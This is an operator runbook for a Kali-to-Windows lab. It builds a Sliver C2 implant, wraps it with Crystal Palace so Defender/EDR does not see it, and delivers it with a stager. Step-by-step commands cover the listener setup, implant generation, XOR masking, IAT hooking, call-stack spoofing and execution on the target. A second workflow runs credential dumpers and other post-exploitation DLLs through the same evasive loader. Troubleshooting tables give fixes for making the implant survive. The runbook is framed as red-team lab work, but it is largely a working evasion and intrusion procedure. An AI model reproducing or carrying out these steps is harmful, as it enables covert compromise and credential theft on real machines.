# Runbook — Operator Procedure (Kali → Windows lab)

End-to-end procedure to build the kit on Kali and execute on a Windows x64 lab target. Two distinct use cases:

- **Use case A (PRIMARY)** — implant evasion. The Sliver DLL is wrapped with Crystal Palace into a PICO and delivered with a stager. The raw Sliver DLL never touches disk on the target.
- **Use case B (SECONDARY)** — post-ex evasion. With a session already active, run sensitive DLLs (recon, credential dumpers) through Crystal Palace via the Sliver Extension.

The two flows share the same build pipeline and Crystal Palace distribution but produce different artifacts.

---

## Phase 0 — One-time setup on Kali

### 0.1 Install toolchain

```bash
sudo apt update
sudo apt install -y mingw-w64 nasm default-jdk make zip git curl
```

Verify:

```bash
x86_64-w64-mingw32-gcc --version | head -1   # MinGW-w64 GCC
nasm --version                                 # >= 2.15
java -version                                  # >= 11
```

### 0.2 Get the repo on Kali

(Whatever transfer method you chose: `rsync`, USB, private Git remote, etc.)

```bash
cd ~/crystal-kit-sliver
ls    # should see README.md, crystal-kit-sliver/, docs/, LICENSE, NOTICE.md
```

### 0.3 Download Crystal Palace dist (BSD, Raphael Mudge)

```bash
mkdir -p external/crystalpalace
curl -fsSL https://tradecraftgarden.org/download/cpdist-latest.tgz \
   | tar -xz -C external/crystalpalace/
chmod +x external/crystalpalace/dist/{link,piclink,coffparse,linkserve}
export CRYSTAL_PALACE_HOME=$(pwd)/external/crystalpalace/dist
```

Sanity check:

```bash
ls "$CRYSTAL_PALACE_HOME"/crystalpalace.jar
"$CRYSTAL_PALACE_HOME"/link 2>&1 | head -3
```

Expected: `Usage: ./link <loader.spec> <file.dll|file.o> <out.bin> ...`

### 0.4 Get `libtcg.x64.zip` from upstream Crystal-Kit

```bash
git clone --depth 1 https://github.com/rasta-mouse/Crystal-Kit /tmp/ck
cp /tmp/ck/libtcg.x64.zip crystal-kit-sliver/
rm -rf /tmp/ck
ls -la crystal-kit-sliver/libtcg.x64.zip
```

### 0.5 Install Sliver

```bash
curl https://sliver.sh/install | sudo bash
sudo systemctl enable --now sliver
sliver-server
```

Inside the `sliver-server` console:

```
[server] sliver > new-operator --name operator1 --lhost <kali-ip>
# saves operator1_<host>.cfg in the working dir
[server] sliver > exit
```

In another terminal:

```bash
sliver-client import ./operator1_<host>.cfg
sliver-client
```

### 0.6 Prepare the Windows VM

- Windows 10/11 x64, isolated network with the Kali host
- Defender disabled or with the build dir excluded **only for the first smoke test** (to factor out detection from the wrapper plumbing)
- Network reachability from VM → Kali on the listener port you'll use (80 by default)

---

## Phase 1 — Smoke test (validate the wrapper, no Crystal Palace yet)

Goal: prove that the `crystal-loader.x64.dll` Sliver Extension loads inside the implant and executes an arbitrary shellcode passed as argument. Does **not** require `crystalpalace.jar`.

### 1.1 Build the wrapper + smoke shellcode

```bash
cd crystal-kit-sliver/sliver-glue
make -C wrapper all
make -C wrapper smoketest
./pack-extension.sh
ls -la build/
```

Expected files:

- `crystal-loader.x64.dll` (~114 KB, in `sliver-glue/` parent)
- `build/smoketest.bin` (3 bytes: `31 c0 c3` = `xor eax,eax; ret`)
- `build/crystal-loader-0.1.0.tar.gz` (~37 KB)

### 1.2 Start an HTTP listener

In the Sliver client:

```
sliver > http -L 0.0.0.0 -l 80
[*] Started HTTP listener (job 1)
```

### 1.3 Generate a standard (unwrapped) Sliver implant for the smoke test

For Phase 1 only, we want a working implant **without** Crystal Palace so we can isolate the Extension's behaviour from any loader issue.

```
sliver > profiles new --http <kali-ip>:80 --format shared smoke
sliver > profiles generate --profile smoke --save /tmp/smoke.dll
```

### 1.4 Run the implant on the Windows VM

Copy `/tmp/smoke.dll` to the VM and load it:

```cmd
C:\> rundll32.exe smoke.dll,RunDLL
```

Wait for the session in the Sliver console:

```
[*] Session 1 - WIN10-LAB ...
sliver > use 1
sliver (WIN10-LAB) >
```

### 1.5 Install the Extension and run the smoke test

```
sliver (WIN10-LAB) > extensions install ./crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz
[*] Installed extension: crystal-loader

sliver (WIN10-LAB) > crystal payload=./crystal-kit-sliver/sliver-glue/build/smoketest.bin
[crystal-loader] executing PICO
[crystal-loader] PICO returned
```

If you see those two lines and the implant survives, the Extension plumbing works end-to-end.

### 1.6 Common Phase 1 failures

| Symptom | Likely cause | Fix |
|---|---|---|
| `extensions install` fails with JSON error | Manifest schema drift | Compare `extension.json` against a live armory extension (e.g. `sliverarmory/COFFLoader`) |
| `crystal` command not registered | Silent install failure | `extensions list` — if absent, re-run install with `--force` |
| Implant crashes immediately | `"file"` argument type not handled the way we assume | Switch the manifest arg to `"string"`, upload payload via `upload`, pass target-side path |
| `[crystal-loader]` output never appears | `BeaconOutput` callback not routed | Check Sliver server logs at `~/.sliver/logs/sliver.log` |

---

## Phase 2 — Use case A (implant evasion, primary)

Goal: build a Crystal-Palace-wrapped Sliver implant PICO and execute it on the target via the bundled stager. Defender / EDR sees only the stager and a position-independent blob; the actual Sliver DLL is XOR-masked inside the PICO until runtime unmask.

### 2.1 Build Crystal-Kit objects

```bash
cd crystal-kit-sliver
make -C loader all
make -C postex-loader all   # technically optional for Phase 2, useful for Phase 3
```

Expected: `loader/bin/` has 8 `.o` + 1 `.bin`.

### 2.2 Generate a fresh Sliver implant DLL

```
sliver > profiles new --http <kali-ip>:80 --format shared prod
sliver > profiles generate --profile prod --save /tmp/prod.dll
```

`--format shared` produces a raw DLL (not shellcode-packed) — Crystal Palace needs the DLL form.

### 2.3 Wrap with Crystal Palace

```bash
./crystal-kit-sliver/sliver-glue/generate-implant.sh --dll /tmp/prod.dll \
    crystal-kit-sliver/sliver-glue/build/prod.crystal.bin
```

Expected output: PICO ~110-120 KB, written to `build/prod.crystal.bin`.

### 2.4 Bundle with the stager

```bash
./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
    crystal-kit-sliver/sliver-glue/build/prod.crystal.bin \
    crystal-kit-sliver/sliver-glue/build/drop.zip
```

Resulting `drop.zip` (~180 KB) contains:

- `run.x64.exe` (Crystal Palace stager, BSD)
- `prod.crystal.bin` (your PICO)
- `README.txt` (operator notes)

### 2.5 Drop on the Windows VM

Transfer `drop.zip` to the VM through the channel that matches your engagement (scp from operator, USB, SMB share, HTTP serving, etc.). Extract and execute:

```cmd
C:\Users\Public> unzip drop.zip
C:\Users\Public> run.x64.exe prod.crystal.bin
```

Execution order inside `run.x64.exe`:

1. `run.x64.exe` reads `prod.crystal.bin` into RWX memory
2. Jumps to offset 0 of the PICO (Crystal Palace `+gofirst` guarantees `go` is there)
3. Crystal Palace loader resolves Win32 APIs via ror13 hashing
4. Installs IAT hooks on `VirtualAlloc` / `VirtualProtect` / `VirtualFree` / `LoadLibraryA`
5. Installs Draugr call-stack spoofing
6. Unmasks (XOR) the embedded Sliver DLL into a new allocation (`dll_dst`)
7. Registers the beacon's `.pdata` exception table via `RtlAddFunctionTable` — required so Go's runtime can call `RtlLookupFunctionEntry` on beacon addresses (goroutine stack growth / async preemption)
8. Runs TLS callbacks (`DLL_PROCESS_ATTACH`) — CRT static init needed by CGO code
9. Calls `DllMain(DLL_PROCESS_ATTACH)` — Go runtime init
10. Walks the beacon export table and calls `StartW()` — this is the explicit C2-loop entry point; `DllMain` alone does **not** start the beacon goroutine
11. `Sleep(INFINITE)` keeps the loader thread alive so the Go scheduler can run beacon goroutines

On the Sliver console:

```
[*] Session 2 - WIN10-LAB ...
sliver > use 2
sliver (WIN10-LAB) > whoami
```

### 2.6 Common Phase 2 failures

| Symptom | Root cause | Fix |
|---|---|---|
| Process runs ~200 s then exits code 1, zero TCP connections | `.pdata` not registered → `RtlLookupFunctionEntry` returns NULL for all beacon addresses → goroutine stack can't grow → connection goroutine panics | `NTDLL$RtlAddFunctionTable` must be called in `loader.c` before `DllMain` |
| Process exits immediately, no network activity | `StartW` not called — all three data-directory lookups returned zero because code was reading headers from `dll_dst` (which has no headers; Crystal Palace `LoadSections` only maps sections) | Use `GetDataDirectory(&dll_data, entry)` everywhere; save `export_rva` before `VirtualFree(dll_src)` |
| CGO / CRT crashes before any network activity | TLS callback[0] (CRT `_initterm`) never called | Walk `IMAGE_DIRECTORY_ENTRY_TLS` before `DllMain`; get RVA from `GetDataDirectory`, not from `dll_dst` |
| Crash in beacon goroutine shortly after start | `_ExitThread` hook frees `dll_dst` while beacon is running | Remove `cleanup_memory` from `_ExitThread` in `pico.c` |
| Random crashes when beacon sleeps | `_Sleep` hook XOR-masks all DLL sections while Go goroutines on other threads keep executing | Remove `mask_memory` calls from `_Sleep` in `pico.c` |
| `VirtualAlloc` / `VirtualFree` / `VirtualProtect` infinite loop | Fallback inside hook used `KERNEL32$Foo` which is rewritten to `_Foo` by `loader.spec` `attach` directive | Use `KERNELBASE$Foo` as fallback (KERNELBASE is not in any `attach` list) |

### 2.8 Iteration: measure detection

- Re-enable Defender / EDR before subsequent tests
- Use `external/crystalpalace/dist/link ... -g out.yar` to generate YARA rules against your build, useful for guessing the EDR signature surface
- Tweak the `.spec` (e.g. remove `mergelib libtcg.x64.zip` for a leaner build, or swap Draugr for a no-op) and rebuild

---

## Phase 3 — Use case B (post-ex evasion, secondary)

Prerequisite: an active session (from Phase 1, Phase 2, or any other vector).

### 3.1 Build a post-ex DLL

Either yours or a public one (e.g. a recon DLL, a credential dumper, a custom enumerator). Must be Windows x64 and export `DllMain`. Args may be empty or required depending on the DLL.

### 3.2 Wrap with Crystal Palace

```bash
echo "" > /tmp/empty.args   # or actual args specific to your DLL
./crystal-kit-sliver/sliver-glue/generate.sh \
    /path/to/postex.dll \
    /tmp/empty.args \
    crystal-kit-sliver/sliver-glue/build/postex.pico.bin
```

Args are baked into the PICO at link time (Xenon-style `%ARGFILE`).

### 3.3 Install the Sliver Extension (one-time)

If not already done in Phase 1:

```
sliver (WIN10-LAB) > extensions install ./crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz
```

### 3.4 Execute the post-ex PICO

```
sliver (WIN10-LAB) > crystal payload=./crystal-kit-sliver/sliver-glue/build/postex.pico.bin
[crystal-loader] executing PICO
... (your DLL's output via BeaconPrintf)
[crystal-loader] PICO returned
```

---

## Phase 4 — Cleanup / rollback

End-of-engagement:

```
sliver > extensions remove crystal-loader
sliver > sessions kill <id>
sliver > jobs kill <id>
```

Windows VM:

```cmd
C:\> taskkill /F /IM run.x64.exe
```

Local Kali build artifacts:

```bash
make -C crystal-kit-sliver/loader clean
make -C crystal-kit-sliver/postex-loader clean
make -C crystal-kit-sliver/sliver-glue/wrapper clean
rm -rf crystal-kit-sliver/sliver-glue/build
```

---

## Quick smoke test on Kali (sanity check before going to the lab)

Run this end-to-end from a freshly cloned repo. Should complete in under 30 seconds without errors and without an actual Sliver implant DLL:

```bash
cd ~/crystal-kit-sliver
export CRYSTAL_PALACE_HOME=$(pwd)/external/crystalpalace/dist

make -C crystal-kit-sliver/loader all
make -C crystal-kit-sliver/postex-loader all
make -C crystal-kit-sliver/sliver-glue/wrapper all
make -C crystal-kit-sliver/sliver-glue/wrapper smoketest

echo "" > /tmp/empty.args
./crystal-kit-sliver/sliver-glue/generate.sh \
    external/crystalpalace/dist/demo/test.x64.dll \
    /tmp/empty.args \
    crystal-kit-sliver/sliver-glue/build/test-postex.pico.bin

./crystal-kit-sliver/sliver-glue/generate-implant.sh --dll \
    external/crystalpalace/dist/demo/test.x64.dll \
    crystal-kit-sliver/sliver-glue/build/test-implant.bin

./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
    crystal-kit-sliver/sliver-glue/build/test-implant.bin \
    crystal-kit-sliver/sliver-glue/build/test-drop.zip

./crystal-kit-sliver/sliver-glue/pack-extension.sh

ls -la crystal-kit-sliver/sliver-glue/build/
```

If all four artifacts are produced (`test-postex.pico.bin`, `test-implant.bin`, `test-drop.zip`, `crystal-loader-0.1.0.tar.gz`), your Kali side is fully functional.
